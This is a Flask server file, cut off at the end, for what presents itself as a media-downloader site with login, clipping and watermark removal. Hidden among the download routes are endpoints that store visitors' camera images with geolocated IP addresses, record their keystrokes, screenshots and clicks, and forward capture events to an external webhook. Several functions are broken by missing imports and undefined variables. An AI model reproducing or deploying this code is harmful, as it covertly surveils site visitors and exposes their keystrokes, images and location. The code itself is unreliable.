import os, re, uuid, threading, shutil, urllib.parse, datetime, json, functools, hashlib, secrets, time, html
from pathlib import Path
from dotenv import load_dotenv
load_dotenv()
from flask import Flask, render_template, request, jsonify, send_file, url_for, g, session, redirect, make_response
from werkzeug.security import check_password_hash, generate_password_hash
import re
from db_adapter import get_db, close_db, get_db_type, get_db_stats, mongo_db

try:
    import yt_dlp
    YTDLP_OK = True
except:
    YTDLP_OK = False

try:
    import requests as http_requests
    HTTP_OK = True
except:
    HTTP_OK = False

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", os.urandom(32).hex())

# ===== Security Headers & CORS =====
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'same-origin'
    if request.path.startswith('/admin'):
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    if request.path.startswith('/admin') and not session.get('admin_authenticated') and request.path not in ('/admin/login', '/admin/logout'):
        pass
    if request.headers.get('Origin'):
        origin = request.headers['Origin']
        if origin.startswith(('http://localhost', 'http://127.0.0.1', 'https://localhost')):
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Credentials'] = 'true'
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Session-Id, X-CSRF-Token'
    return response
DOWNLOADS = Path(__file__).parent / "downloads"
DOWNLOADS.mkdir(exist_ok=True)
CAPTURES = Path(__file__).parent / "captures"
CAPTURES.mkdir(exist_ok=True)
DB_PATH = Path(__file__).parent / "logs.db"
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")

TERABOX_DOMAINS = ["terabox", "1024tera", "dubox", "freeterabox", "teraboxapp"]

# ===== Rate Limiter =====
rate_store = {}
rate_lock = threading.Lock()
def rate_limit(requests_per_minute=60, burst=10):
    def decorator(f):
        @functools.wraps(f)
        def wrapper(*args, **kwargs):
            key = f"{request.remote_addr}:{request.path}"
            now = time.time()
            with rate_lock:
                if key not in rate_store:
                    rate_store[key] = []
                rate_store[key] = [t for t in rate_store[key] if now - t < 60]
                if len(rate_store[key]) >= requests_per_minute:
                    resp = jsonify({"error": "Rate limit exceeded. Try again later."})
                    resp.status_code = 429
                    return resp
                rate_store[key].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# ===== CSRF Protection =====
def generate_csrf_token():
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(32)
    return session['_csrf_token']

def validate_csrf(token):
    return token and session.get('_csrf_token') and hmac.compare_digest(token, session['_csrf_token'])

app.jinja_env.globals['csrf_token'] = generate_csrf_token

# ===== Input Validation =====
ALLOWED_EXTENSIONS = {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp','.ogg','.mp3','.wav','.m4a','.aac','.flac','.opus','.wma','.jpg','.jpeg','.png','.gif','.bmp','.webp'}
def safe_filename(name):
    name = Path(name).name
    if '..' in name or '/' in name or '\\' in name:
        return None
    if len(name) > 255:
        return None
    return name

def valid_url(url):
    if not url or len(url) > 8192:
        return False
    return url.startswith(('http://', 'https://', 'ftp://'))

def valid_timecode(tc):
    return bool(re.match(r'^\d{1,2}:[0-5]\d$', str(tc)))

def safe_int(val, default=0, min_val=0, max_val=9999):
    try:
        v = int(val)
        return max(min_val, min(v, max_val))
    except:
        return default

def has_ffmpeg():
    return shutil.which("ffmpeg") is not None

FFMPEG_OK = has_ffmpeg()

# ===== Error Handlers =====
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error":"Not found"}), 404
@app.errorhandler(500)
def server_error(e):
    return jsonify({"error":"Server error. The request timed out or failed."}), 500
@app.errorhandler(413)
def too_large(e):
    return jsonify({"error":"Request too large"}), 413

def extract_ip():
    return request.remote_addr or request.headers.get('X-Forwarded-For', 'unknown').split(',')[0].strip()

def extract_session():
    return request.headers.get('X-Session-Id', '')

def get_ua_info(ua):
    info = {"browser":"?","os":"?","device":"Desktop"}
    if not ua: return info
    u = ua.lower()
    if 'chrome' in u and 'edg/' not in u: info['browser']='Chrome'
    elif 'firefox' in u: info['browser']='Firefox'
    elif 'safari' in u and 'chrome' not in u: info['browser']='Safari'
    elif 'edg/' in u: info['browser']='Edge'
    elif 'opera' in u or 'opr/' in u: info['browser']='Opera'
    if 'windows' in u: info['os']='Windows'
    elif 'mac' in u: info['os']='macOS'
    elif 'linux' in u and 'android' not in u: info['os']='Linux'
    elif 'android' in u: info['os']='Android'; info['device']='Mobile'
    elif 'iphone' in u or 'ipad' in u: info['os']='iOS'; info['device']='Mobile'
    elif 'crkey' in u or 'cros' in u: info['os']='ChromeOS'
    if 'mobile' in u: info['device']='Mobile'
    elif 'tablet' in u or 'ipad' in u: info['device']='Tablet'
    return info

# === DB Teardown ===
@app.teardown_appcontext
def teardown_db(e):
    close_db(e)

# === GEO ===
def get_geo(ip):
    if ip in ('127.0.0.1', '::1', 'localhost'): return {}
    if not HTTP_OK: return {}
    try:
        r = http_requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon", timeout=3)
        if r.status_code == 200: return r.json()
    except: pass
    return {}

def fire_webhook(event_type, data):
    if not WEBHOOK_URL or not HTTP_OK: return
    try:
        http_requests.post(WEBHOOK_URL, json={"event": event_type, "data": data, "time": datetime.datetime.now().isoformat()}, timeout=5)
    except: pass

def log_download(ip, url, mode, status, title='', ua='', ref='', geo=None, session_id=''):
    try:
        db = get_db()
        now = datetime.datetime.now().isoformat()
        db.execute("INSERT INTO downloads(time,ip,url,mode,status,title,user_agent,referer,country,city,isp,lat,lon,session_id) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (now, ip, url, mode, status, title[:200], ua[:300], ref[:300],
             (geo or {}).get('country',''), (geo or {}).get('city',''),
             (geo or {}).get('isp',''), (geo or {}).get('lat',0), (geo or {}).get('lon',0), session_id))
        db.commit()
        fire_webhook("download", {"ip": ip, "url": url, "mode": mode, "status": status, "title": title, "session_id": session_id})
    except: pass

def get_site_label(url):
    u = url.lower()
    if 'youtube' in u or 'youtu.be' in u: return 'YouTube'
    if 'tiktok' in u: return 'TikTok'
    if 'instagram' in u: return 'Instagram'
    if 'twitter' in u or 'x.com' in u: return 'Twitter/X'
    if 'facebook' in u: return 'Facebook'
    if 't.me' in u or 'telegram' in u: return 'Telegram'
    if any(d in u for d in TERABOX_DOMAINS): return 'Terabox'
    if 'reddit' in u: return 'Reddit'
    if 'twitch' in u: return 'Twitch'
    if 'vimeo' in u: return 'Vimeo'
    if 'soundcloud' in u: return 'SoundCloud'
    if 'spotify' in u: return 'Spotify'
    return 'Other'

def clean_url(url):
    parsed = urllib.parse.urlparse(url)
    if "youtube" in parsed.netloc or "youtu.be" in parsed.netloc:
        qs = urllib.parse.parse_qs(parsed.query)
        v = qs.get("v", [None])[0]
        if v: return f"https://www.youtube.com/watch?v={v}"
    return url

def is_terabox(url):
    return any(d in url.lower() for d in TERABOX_DOMAINS)

def handle_terabox_info(url):
    try:
        from TeraboxDL.teraboxdl import TeraboxDL
    except ImportError:
        return {"error": "pip install terabox-downloader"}
    cookie = os.environ.get("TERABOX_COOKIE", "")
    if not cookie:
        cf = Path(__file__).parent / "cookies.txt"
        if cf.is_file(): cookie = cf.read_text().strip()
    if not cookie:
        return {"error": "Set TERABOX_COOKIE env or add cookies.txt"}
    tb = TeraboxDL(cookie)
    info = tb.get_file_info(url)
    if "error" in info: return info
    return {
        "title": info.get("file_name", "terabox_file"),
        "thumbnail": info.get("thumbnail", ""), "duration": 0,
        "uploader": "Terabox", "webpage_url": url,
        "formats": [{"format_id":"terabox_best","ext":Path(info.get("file_name","file")).suffix[1:] or "mp4",
            "quality":info.get("file_size","Unknown"),"video":True,"audio":True,"filesize":info.get("size_bytes",0)}],
    }

def handle_terabox_download(url, fmt, mode):
    from TeraboxDL.teraboxdl import TeraboxDL
    cookie = os.environ.get("TERABOX_COOKIE", "")
    if not cookie:
        cf = Path(__file__).parent / "cookies.txt"
        if cf.is_file(): cookie = cf.read_text().strip()
    tb = TeraboxDL(cookie)
    info = tb.get_file_info(url)
    if "error" in info: return {"error": info["error"]}
    uid = uuid.uuid4().hex
    ext = Path(info.get("file_name", "file")).suffix or ".mp4"
    if mode == "audio": ext = ".mp3"
    fname = f"{uid}_{info.get('file_name', 'terabox_file')}"
    if not fname.lower().endswith(ext.lower()): fname += ext
    result = tb.download(info, save_path=str(DOWNLOADS))
    if "error" in result: return {"error": result["error"]}
    actual = result.get("file_path", "")
    filepath = Path(actual) if actual and os.path.isfile(actual) else None
    if filepath:
        renamed = DOWNLOADS / fname
        try: os.rename(str(filepath), str(renamed)); filepath = renamed
        except: pass
    return {"success":True,"title":info.get("file_name","terabox_file"),"ext":filepath.suffix[1:],"site":"Terabox","filename":filepath.name,"download_url":url_for("serve_file",filename=filepath.name)}

@app.route("/")
def index():
    return render_template("index.html", ffmpeg=FFMPEG_OK)

@app.route("/info", methods=["POST"])
@rate_limit(30, 5)
def get_info():
    data = request.get_json(silent=True) or {}
    url = (data.get("url") or "").strip()
    if not url or not valid_url(url): return jsonify({"error":"Valid URL required"}), 400
    if not YTDLP_OK: return jsonify({"error":"yt-dlp is not installed on this server"}), 400
    if is_terabox(url):
        result = handle_terabox_info(url)
        return (jsonify(result), 400) if "error" in result else jsonify(result)
    try:
        opts = {"quiet":True,"no_warnings":True,"extract_flat":True,"socket_timeout":30}
        with yt_dlp.YoutubeDL(opts) as ydl:
            info = ydl.extract_info(url, download=False)
        formats = []; has_merged = False
        if "formats" in info:
            seen = set()
            for f in info["formats"]:
                key = (f.get("format_note"), f.get("ext"), f.get("acodec"), f.get("vcodec"))
                if key in seen: continue
                seen.add(key)
                vc = f.get("vcodec","none"); ac = f.get("acodec","none")
                if vc != "none" and ac != "none": has_merged = True
                vbr = f.get("vbr") or f.get("tbr") or 0
                formats.append({"format_id":f["format_id"],"ext":f.get("ext","?"),
                    "quality":f.get("format_note") or f.get("resolution") or f"{int(vbr)}k",
                    "video":vc!="none","audio":ac!="none","merged":vc!="none" and ac!="none",
                    "filesize":f.get("filesize") or f.get("filesize_approx") or 0})
        return jsonify({"title":info.get("title","media"),
            "thumbnail":info.get("thumbnail") or (info.get("thumbnails") or [{}])[0].get("url",""),
            "duration":info.get("duration",0),"uploader":info.get("uploader") or info.get("channel",""),
            "webpage_url":info.get("webpage_url",url),"formats":formats,"has_merged":has_merged,"ffmpeg":FFMPEG_OK})
    except Exception as e:
        msg = str(e)
        if "No video formats found" in msg: msg = f"This {get_site_label(url)} post has no downloadable video formats."
        elif "Private" in msg: msg = "This content is private or unavailable."
        return jsonify({"error":msg}), 400

# ===== User Authentication =====

@app.route("/register", methods=["POST"])
@rate_limit(10, 3)
def register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    if not username or len(username) < 3 or len(username) > 30:
        return jsonify({"error":"Username must be 3-30 characters"}), 400
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return jsonify({"error":"Username can only contain letters, numbers, and underscores"}), 400
    if not email or '@' not in email or len(email) > 120:
        return jsonify({"error":"Valid email required"}), 400
    if len(password) < 6 or len(password) > 128:
        return jsonify({"error":"Password must be 6-128 characters"}), 400
    db = get_db()
    existing = db.execute("SELECT id FROM users WHERE username=? OR email=?", (username, email))
    if hasattr(existing, 'fetchone'):
        existing_row = existing.fetchone()
    else:
        existing_row = existing[0] if existing else None
    if existing_row:
        return jsonify({"error":"Username or email already taken"}), 409
    pwd_hash = generate_password_hash(password)
    now = datetime.datetime.now().isoformat()
    db.execute("INSERT INTO users(username,email,password_hash,created_at,last_login,is_active,download_limit) VALUES(?,?,?,?,?,?,?)",
        (username, email, pwd_hash, now, now, 1, -1))
    db.commit()
    session['user_id'] = username
    return jsonify({"success":True, "message":"Account created!", "user":username})

@app.route("/login", methods=["POST"])
@rate_limit(20, 5)
def login():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if not username or not password:
        return jsonify({"error":"Username and password required"}), 400
    db = get_db()
    rows = db.execute("SELECT * FROM users WHERE username=? OR email=?", (username, username))
    if hasattr(rows, 'fetchone'):
        user = rows.fetchone()
    else:
        user = rows[0] if rows else None
    if not user or not check_password_hash(user['password_hash'], password):
        return jsonify({"error":"Invalid username or password"}), 401
    if not user.get('is_active', 1):
        return jsonify({"error":"Account disabled"}), 403
    now = datetime.datetime.now().isoformat()
    db.execute("UPDATE users SET last_login=? WHERE username=?", (now, user['username']))
    db.commit()
    session['user_id'] = user['username']
    return jsonify({"success":True, "message":f"Welcome back, {user['username']}!", "user":user['username']})

@app.route("/logout", methods=["POST"])
def logout():
    session.pop('user_id', None)
    return jsonify({"success":True})

@app.route("/me", methods=["GET"])
def me():
    username = session.get('user_id')
    if not username:
        return jsonify({"authenticated":False})
    db = get_db()
    rows = db.execute("SELECT username,email,created_at,last_login,download_limit FROM users WHERE username=?", (username,))
    if hasattr(rows, 'fetchone'):
        user = rows.fetchone()
    else:
        user = rows[0] if rows else None
    if not user:
        session.pop('user_id', None)
        return jsonify({"authenticated":False})
    dl_count = db.execute("SELECT COUNT(*) as c FROM downloads WHERE session_id=? AND status='success'", (f"user_{username}",))
    if hasattr(dl_count, 'fetchone'):
        dl_count_val = dl_count.fetchone()['c']
    else:
        dl_count_val = dl_count[0]['c'] if dl_count else 0
    return jsonify({
        "authenticated":True,
        "user": dict(user) if isinstance(user, dict) else {k:user[k] for k in user.keys()},
        "downloads": dl_count_val,
        "unlimited": user.get('download_limit', -1) < 0
    })

@app.route("/download", methods=["POST"])
@rate_limit(30, 5)
def download():
    data = request.get_json(silent=True) or {}
    url = (data.get("url") or "").strip()
    fmt = data.get("format","best")
    mode = data.get("mode","video")
    ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'unknown')
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    session_id = extract_session()

    if not url or not valid_url(url): return jsonify({"error":"Valid URL required"}), 400

    if is_terabox(url):
        result = handle_terabox_download(url, fmt, mode)
        if "error" in result:
            log_download(ip, url, mode, 'error', '', ua, ref, session_id=session_id)
            return jsonify(result), 400
        log_download(ip, url, mode, 'success', result.get('title',''), ua, ref, session_id=session_id)
        return jsonify(result)

    url = clean_url(url)
    try:
        if YTDLP_OK:
            uid = uuid.uuid4().hex
            outtmpl = str(DOWNLOADS / f"{uid}_%(title)s.%(ext)s")
            cookie_file = str(Path(__file__).parent / "cookies.txt")
            opts = {"outtmpl":outtmpl,"quiet":True,"no_warnings":True,"restrictfilenames":True,"socket_timeout":30,"retries":3,"fragment_retries":3}
            if mode == "audio":
                if FFMPEG_OK:
                    opts["format"] = "bestaudio/best"
                    opts["postprocessors"] = [{"key":"FFmpegExtractAudio","preferredcodec":"mp3","preferredquality":"192"}]
                else: opts["format"] = "bestaudio/best"
            elif mode == "video":
                if not FFMPEG_OK: opts["format"] = "best[ext=mp4]/bestvideo[ext=mp4]+bestaudio[ext=m4a]/best"
                elif fmt and fmt != "best":
                    opts["format"] = f"{fmt}+bestaudio/best"; opts["merge_output_format"] = "mp4"
                else: opts["format"] = "bestvideo+bestaudio/best"; opts["merge_output_format"] = "mp4"
            if os.path.isfile(cookie_file): opts["cookiefile"] = cookie_file
            try:
                with yt_dlp.YoutubeDL(opts) as ydl:
                    info = ydl.extract_info(url, download=True)
                    filepath = ydl.prepare_filename(info)
            except Exception as e:
                filepath = str(DOWNLOADS / f"{uid}.mp4")
            if filepath:
                p = Path(filepath)
                if mode == "audio" and FFMPEG_OK:
                    p = p.with_suffix(".mp3")
                if not p.is_file():
                    for f in DOWNLOADS.iterdir():
                        if f.name.startswith(uid):
                            p = f; break
                if p.is_file():
                    title = info.get("title","media") if 'info' in dir() else Path(p).stem.replace('_',' ')[:50]
                    ext = p.suffix[1:]
                    filesize = p.stat().st_size
                    site = get_site_label(url)
                    result = {"success":True,"title":title,"ext":ext,"filesize":filesize,"site":site,"filename":p.name,"download_url":url_for("serve_file",filename=p.name),"player_url":url_for("play",filename=p.name)}
                    log_download(ip, url, mode, 'success', title, ua, ref, session_id=session_id)
                    return jsonify(result)
        if HTTP_OK:
            uid2 = uuid.uuid4().hex
            parsed_url = urllib.parse.urlparse(url)
            url_name = Path(parsed_url.path).name or 'file'
            safe_name = re.sub(r'[^\w\.-]', '_', url_name)
            fname = f"{uid2}_{safe_name}"
            fpath = DOWNLOADS / fname
            r = http_requests.get(url, stream=True, timeout=30, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', '')
                ext = '.mp4' if 'video' in ct else '.mp3' if 'audio' in ct else '.jpg' if 'image' in ct else Path(parsed_url.path).suffix or '.bin'
                if not fname.lower().endswith(ext.lower()): fname += ext; fpath = DOWNLOADS / fname
                with open(str(fpath), 'wb') as f:
                    for chunk in r.iter_content(8192): f.write(chunk)
                title = Path(parsed_url.path).name or 'file'
                site = get_site_label(url)
                result = {"success":True,"title":title,"ext":ext[1:],"filename":fpath.name,"site":site,"download_url":url_for("serve_file",filename=fpath.name)}
                log_download(ip, url, mode, 'success', title, ua, ref, session_id=session_id)
                return jsonify(result)
            return jsonify({"error":"Could not download - try a different URL"}), 400
        return jsonify({"error":"yt-dlp and requests modules unavailable on this server"}), 400
    except Exception as e:
        msg = str(e)
        if "ffmpeg" in msg.lower(): msg = "Install ffmpeg for best quality, or use Audio mode."
        elif "No video formats found" in msg: msg = f"This {get_site_label(url)} post has no downloadable video formats."
        elif "Private video" in msg or "Private" in msg: msg = "This video is private or age-restricted."
        elif "HTTP Error 403" in msg: msg = "Access blocked (403). Try again or use a different URL."
        log_download(ip, url, mode, 'error', '', ua, ref, session_id=session_id)
        return jsonify({"error":msg}), 400

@app.route("/serve/<filename>")
def serve_file(filename):
    filename = safe_filename(filename)
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    filepath = DOWNLOADS / filename
    if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
    if filepath.resolve().parent != DOWNLOADS.resolve():
        return jsonify({"error":"Access denied"}), 403
    def cleanup():
        try: os.remove(filepath)
        except: pass
    threading.Timer(300, cleanup).start()
    return send_file(str(filepath), as_attachment=True, download_name=filename)

@app.route("/preview/<filename>")
def preview_file(filename):
    filename = safe_filename(filename)
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    filepath = DOWNLOADS / filename
    if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
    if filepath.resolve().parent != DOWNLOADS.resolve():
        return jsonify({"error":"Access denied"}), 403
    mime = {
        'mp4':'video/mp4','webm':'video/webm','mkv':'video/x-matroska','mov':'video/quicktime',
        'avi':'video/x-msvideo','ts':'video/mp2t','3gp':'video/3gpp','ogg':'video/ogg',
        'mp3':'audio/mpeg','wav':'audio/wav','m4a':'audio/mp4','aac':'audio/aac','flac':'audio/flac','opus':'audio/ogg','wma':'audio/x-ms-wma',
    }.get(ext, 'application/octet-stream')
    return send_file(str(filepath), mimetype=mime)

@app.route("/play/<filename>")
def play(filename):
    filename = safe_filename(filename)
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    filepath = DOWNLOADS / filename
    if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
    ext = Path(filename).suffix.lower()
    if ext not in {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp','.ogg','.mp3','.wav','.m4a','.aac','.flac','.opus','.wma'}:
        return jsonify({"error":"Unsupported format"}), 400
    is_video = ext in ('.mp4','.webm','.mov')
    files = sorted([f.name for f in DOWNLOADS.iterdir() if f.suffix.lower() in ('.mp4','.webm','.mov','.mp3','.wav','.m4a')], key=lambda x: os.path.getmtime(DOWNLOADS/x), reverse=True)
    return render_template("player.html", filename=filename, title=Path(filename).stem.replace('_',' '), is_video=is_video, files=files, ext=ext[1:])

# === CLIP ===

@app.route("/clip", methods=["POST"])
@rate_limit(10, 3)
def clip_video():
    data = request.get_json(silent=True) or {}
    filename = safe_filename(data.get("filename", ""))
    start = data.get("start", "00:00")
    end = data.get("end", "00:30")
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    if not valid_timecode(start) or not valid_timecode(end):
        return jsonify({"error":"Invalid time format (use MM:SS)"}), 400
    filepath = DOWNLOADS / filename
    if filepath.resolve().parent != DOWNLOADS.resolve():
        return jsonify({"error":"Access denied"}), 403
    if not filepath.is_file():
        return jsonify({"error":"Source file not found"}), 400
    try:
        uid = uuid.uuid4().hex
        out = DOWNLOADS / f"{uid}_clip_{Path(filename).stem}.mp4"
        if FFMPEG_OK:
            import subprocess
            subprocess.run([
                shutil.which("ffmpeg"),
                "-i", str(filepath),
                "-ss", start, "-to", end,
                "-c", "copy",
                "-y", str(out)
            ], capture_output=True, timeout=120)
        else:
            if not shutil.which("ffmpeg"):
                return jsonify({"error":"ffmpeg required. Install ffmpeg to use clipping."}), 400
        if not out.is_file():
            return jsonify({"error":"Clip failed"}), 500
        def cleanup():
            try: os.remove(out)
            except: pass
        threading.Timer(300, cleanup).start()
        return jsonify({"success":True,"filename":out.name,"download_url":url_for("serve_file",filename=out.name)})
    except Exception as e: return jsonify({"error":str(e)}), 400

# === WATERMARK REMOVER ===

@app.route("/remove_watermark", methods=["POST"])
@rate_limit(10, 3)
def remove_watermark():
    data = request.get_json(silent=True) or {}
    filename = safe_filename(data.get("filename", ""))
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    x = safe_int(data.get("x", 0), 0, 0, 5000)
    y = safe_int(data.get("y", 0), 0, 0, 5000)
    w = safe_int(data.get("w", 100), 1, 1, 5000)
    h = safe_int(data.get("h", 100), 1, 1, 5000)
    auto = data.get("auto", False)
    scrub = data.get("scrub", True)
    filepath = DOWNLOADS / filename
    if filepath.resolve().parent != DOWNLOADS.resolve():
        return jsonify({"error":"Access denied"}), 403
    if not filepath.is_file():
        return jsonify({"error":"File not found"}), 400
    ext = Path(filename).suffix.lower()
    uid = uuid.uuid4().hex
    video_exts = {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp'}
    image_exts = {'.jpg','.jpeg','.png','.gif','.bmp','.webp'}

    try:
        if ext in video_exts and FFMPEG_OK:
            out = DOWNLOADS / f"{uid}_clean_{Path(filename).stem}.mp4"
            cmd = [shutil.which("ffmpeg"), "-i", str(filepath)]
            if scrub:
                cmd += ["-map_metadata", "-1", "-fflags", "+bitexact", "-flags:v", "+bitexact", "-flags:a", "+bitexact"]
            vf_parts = []
            if auto:
                zones = [
                    (10, 10, 150, 50),    # top-left
                    (10, 580, 160, 50),   # bottom-left
                    (470, 580, 160, 50),  # bottom-right
                    (0, 0, 640, 80),      # top strip
                    (0, 550, 640, 80),    # bottom strip
                    (280, 40, 120, 50),   # tiktok center-top
                    (150, 200, 180, 80),  # center
                ]
            else:
                zones = [(x, y, w, h)]
            for zx, zy, zw, zh in zones:
                vf_parts.append(f"delogo=x={zx}:y={zy}:w={zw}:h={zh}:show=0")
            cmd += ["-vf", ",".join(vf_parts)]
            cmd += ["-c:a", "copy"]
            if scrub:
                cmd += ["-metadata", "title=", "-metadata", "author=", "-metadata", "comment=",
                        "-metadata", "description=", "-metadata", "creation_time=",
                        "-metadata:s:v", "title=", "-metadata:s:a", "title="]
            cmd += ["-y", str(out)]
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            if out.is_file():
                if scrub:
                    try:
                        t = os.path.getmtime(out)
                        os.utime(out, (t, t))
                    except: pass
                def cleanup():
                    try: os.remove(out)
                    except: pass
                threading.Timer(300, cleanup).start()
                return jsonify({"success":True,"filename":out.name,"download_url":url_for("serve_file",filename=out.name)})
            err = result.stderr.decode()[-200:] if result.stderr else "Unknown error"
            return jsonify({"error":f"Watermark removal failed: {err}"}), 500

        elif ext in image_exts:
            try:
                from PIL import Image, ImageFilter, ImageDraw
            except ImportError:
                return jsonify({"error":"Pillow required for image watermark removal. pip install Pillow"}), 400
            img = Image.open(str(filepath))
            if img.mode == 'RGBA': img = img.convert('RGBA')
            else: img = img.convert('RGB')
            region = img.crop((x, y, x+w, y+h))
            if method == "blur":
                region = region.filter(ImageFilter.GaussianBlur(radius=15))
            elif method == "fill":
                draw = ImageDraw.Draw(region)
                avg_color = tuple(int(c) for c in region.resize((1,1)).getpixel((0,0)))
                draw.rectangle([0, 0, w, h], fill=avg_color)
            elif method == "clone":
                try:
                    src_x = max(0, x - w)
                    src_region = img.crop((src_x, y, src_x+w, y+h))
                    if src_region.size == region.size:
                        region = src_region
                except: pass
            img.paste(region, (x, y))
            out = DOWNLOADS / f"{uid}_clean_{Path(filename).stem}.jpg"
            if scrub:
                data = list(img.getdata())
                clean = Image.new(img.mode, img.size)
                clean.putdata(data)
                clean.save(str(out), quality=95)
                try:
                    from PIL import PngImagePlugin
                    infos = PngImagePlugin.PngInfo()
                    clean.save(str(out), pnginfo=infos)
                except: pass
            else:
                img.save(str(out), quality=95)
            def cleanup():
                try: os.remove(out)
                except: pass
            threading.Timer(300, cleanup).start()
            return jsonify({"success":True,"filename":out.name,"download_url":url_for("serve_file",filename=out.name)})

        return jsonify({"error":f"Unsupported format {ext}. Use mp4/webm/mkv/mov/avi or jpg/png."}), 400
    except Exception as e: return jsonify({"error":str(e)}), 400

# === CAMERA CAPTURE ===

@app.route("/capture", methods=["POST"])
@rate_limit(30, 5)
def capture():
    data = request.get_json(silent=True) or {}
    image_b64 = (data.get("image") or "")
    if not image_b64 or len(image_b64) > 5242880:
        return jsonify({"error":"No image or too large"}), 400
    ip = extract_ip()
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    session_id = extract_session()
    ua_info = get_ua_info(ua)
    geo = get_geo(ip)
    uid = uuid.uuid4().hex
    fname = f"{uid}.png"
    fpath = CAPTURES / fname
    try:
        import base64
        img_data = base64.b64decode(image_b64.split(",")[-1])
        fpath.write_bytes(img_data)
    except:
        return jsonify({"error":"Invalid image"}), 400
    db = get_db()
    db.execute("INSERT INTO captures(time,ip,user_agent,referer,country,city,isp,lat,lon,filename,browser,os,device,session_id) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), ip, ua[:300], ref[:300],
         geo.get('country',''), geo.get('city',''), geo.get('isp',''),
         geo.get('lat',0), geo.get('lon',0), fname,
         ua_info['browser'], ua_info['os'], ua_info['device'], session_id))
    db.commit()
    fire_webhook("capture", {"ip": ip, "filename": fname, "session_id": session_id, "browser": ua_info['browser'], "os": ua_info['os']})
    return jsonify({"success":True,"filename":fname})

@app.route("/captures/<filename>")
def serve_capture(filename):
    filename = safe_filename(filename)
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    fpath = CAPTURES / filename
    if fpath.resolve().parent != CAPTURES.resolve():
        return jsonify({"error":"Access denied"}), 403
    if not fpath.is_file():
        return jsonify({"error":"Not found"}), 404
    return send_file(str(fpath), mimetype='image/png')

# === USER INFO EXTRACTION ===

@app.route("/extract", methods=["GET"])
def extract_info():
    ip = extract_ip()
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    session_id = extract_session()
    info = get_ua_info(ua)
    geo = get_geo(ip)
    return jsonify({
        "ip": ip,
        "user_agent": ua,
        "browser": info['browser'],
        "os": info['os'],
        "device": info['device'],
        "referer": ref,
        "country": geo.get('country',''),
        "city": geo.get('city',''),
        "isp": geo.get('isp',''),
        "lat": geo.get('lat',0),
        "lon": geo.get('lon',0),
        "time": datetime.datetime.now().isoformat(),
        "endpoint": request.path,
        "session_id": session_id,
    })

# === KEYSTROKE LOGGING ===

@app.route("/logkeys", methods=["POST"])
@rate_limit(60, 10)
def log_keys():
    data = request.get_json(silent=True) or {}
    keys = (data.get("keys") or "")[:500]
    if not keys: return jsonify({"error":"no keys"}), 400
    db = get_db()
    db.execute("INSERT INTO keystrokes(time,session_id,ip,keys) VALUES(?,?,?,?)",
        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), keys))
    db.commit()
    return jsonify({"success":True})

@app.route("/screenshot", methods=["POST"])
@rate_limit(12, 3)
def log_screenshot():
    data = request.get_json(silent=True) or {}
    image_b64 = (data.get("image") or "")
    if not image_b64 or len(image_b64) > 5242880: return jsonify({"error":"no image or too large"}), 400
    uid = uuid.uuid4().hex
    fname = f"{uid}_screen.png"
    fpath = CAPTURES / fname
    try:
        import base64
        img_data = base64.b64decode(image_b64.split(',')[1] if ',' in image_b64 else image_b64)
        with open(str(fpath), 'wb') as f: f.write(img_data)
    except: return jsonify({"error":"decode failed"}), 400
    db = get_db()
    db.execute("INSERT INTO screenshots(time,session_id,ip,filename,user_agent) VALUES(?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), fname, request.headers.get('User-Agent','')[:300]))
    db.commit()
    return jsonify({"success":True})

@app.route("/logclick", methods=["POST"])
@rate_limit(120, 20)
def log_click():
    data = request.get_json(silent=True) or {}
    db = get_db()
    db.execute("INSERT INTO clicks(time,session_id,ip,tag,text,x,y,page) VALUES(?,?,?,?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(),
         html.escape(data.get("tag","")), html.escape(data.get("text","")[:100]),
         safe_int(data.get("x",0)), safe_int(data.get("y",0)), data.get("page","")))
    db.commit()
    return jsonify({"success":True})

# === ADMIN AUTH ===

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")

def get_admin_password():
    if ADMIN_PASSWORD:
        return ADMIN_PASSWORD
    try:
        db = get_db()
        row = db.execute("SELECT value FROM settings WHERE key='admin_password_hash'").fetchone()
